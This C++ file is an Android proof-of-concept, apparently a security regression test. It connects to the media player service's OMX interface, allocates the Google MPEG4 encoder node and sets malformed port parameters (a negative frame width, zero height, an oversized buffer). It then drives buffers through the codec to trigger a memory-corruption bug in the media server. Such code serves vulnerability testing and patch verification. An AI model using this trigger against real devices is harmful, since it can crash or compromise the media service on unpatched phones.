/**
 * Copyright (C) 2017 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include "local_poc.h"
#include <media/IOMX.h>
#include "OMX_IndexExt.h"
#include "OMX_QCOMExtns.h"
#include "OMX_Component.h"
#include "gralloc_priv.h"
#include <media/hardware/HardwareAPI.h>

struct DummyOMXObserver: public BnOMXObserver {
public:
    DummyOMXObserver() {
        ALOGI("DummyOMXObserver, this: %p", this);
    }

    virtual void onMessages(const std::list<omx_message> &messages) {
        ALOGI("dummy omx observer");
        if (messages.empty()) {
            return;
        }
    }

protected:
    virtual ~DummyOMXObserver() {
    }
};

static bool connectOMX(sp<IOMX> &omx) {
    sp<IServiceManager> sm = defaultServiceManager();

    sp<IBinder> binder = sm->getService(String16("media.player"));
    sp<IMediaPlayerService> mediaPlayerService = interface_cast<
            IMediaPlayerService>(binder);

    if (mediaPlayerService == NULL) {
        ALOGE("cannot get the media player service");
        return false;
    }

    omx = mediaPlayerService->getOMX();
    if (omx == NULL) {
        ALOGE("cannot get the OMX interface");
        return false;
    }

    return true;
}

int main() {
    sp<IOMX> service;
    if (connectOMX(service) == false)
        return -1;
    IOMX::node_id node = 0;
    int fenceFd = -1;

    sp<DummyOMXObserver> observer = new DummyOMXObserver();
    char *codecName = "OMX.google.mpeg4.encoder";
    status_t err = service->allocateNode(codecName, observer, nullptr, &node);
    if (err != OK) {
        return -1;
    }

    // get input port parameters
    OMX_PARAM_PORTDEFINITIONTYPE def;
    InitOMXParams(&def);
    def.nPortIndex = 0;
    err = service->getParameter(node, OMX_IndexParamPortDefinition, &def, sizeof(def));

    def.nBufferSize = 11182506;
    def.format.video.nFrameWidth = -3200000;
    def.format.video.nFrameHeight = 0;
    err = service->setParameter(node, OMX_IndexParamPortDefinition, &def, sizeof(def));

    // prepare input port buffers
    int inMemSize = def.nBufferCountActual * def.nBufferSize;
    int inBufferCnt = def.nBufferCountActual;
    int inBufferSize = inMemSize / inBufferCnt;

    sp<MemoryDealer> dealerIn = new MemoryDealer(inMemSize);
    IOMX::buffer_id *inBufferId = new IOMX::buffer_id[inBufferCnt];

    // get output port parameters
    InitOMXParams(&def);
    def.nPortIndex = 1;

    err = service->getParameter(node, OMX_IndexParamPortDefinition, &def, sizeof(def));

    // prepare output port buffers
    int outMemSize = def.nBufferCountActual * def.nBufferSize;
    int outBufferCnt = def.nBufferCountActual;
    int outBufferSize = outMemSize / outBufferCnt;

    sp<MemoryDealer> dealerOut = new MemoryDealer(outMemSize);
    IOMX::buffer_id *outBufferId = new IOMX::buffer_id[outBufferCnt];

    // enable allocate_native_handle
    err = service->enableNativeBuffers(node, 2, (OMX_BOOL)2, (OMX_BOOL)0);

    for (int i = 0; i < inBufferCnt; i++) {
        sp<IMemory> memory = dealerIn->allocate(inBufferSize);
        err = service->useBuffer(node, 0, memory, &inBufferId[i], inBufferSize/*allottedSize*/);
    }

    for (int i = 0; i < outBufferCnt; i++) {
        sp<IMemory> memory = dealerOut->allocate(outBufferSize);
        if (memory == 0 || memory->pointer() == NULL) {
            return -1;
        }
        err = service->allocateBufferWithBackup(node, 1/*in port index*/, memory, &outBufferId[i], outBufferSize);
    }

    // change state from loaded to idle
    err = service->sendCommand(node, OMX_CommandStateSet, 2);

    // change state from idle to executing
    err = service->sendCommand(node, OMX_CommandStateSet, 3);

    sleep(3);

    for (int i = 0; i < inBufferCnt; i++) {
        err = service->emptyBuffer(node, inBufferId[i], 0, inBufferSize, 0, 0, fenceFd);
    }

    for (int i = 0; i <outBufferCnt ; i++) {
        err = service->fillBuffer(node, outBufferId[i], fenceFd);
    }
    return 0;
}
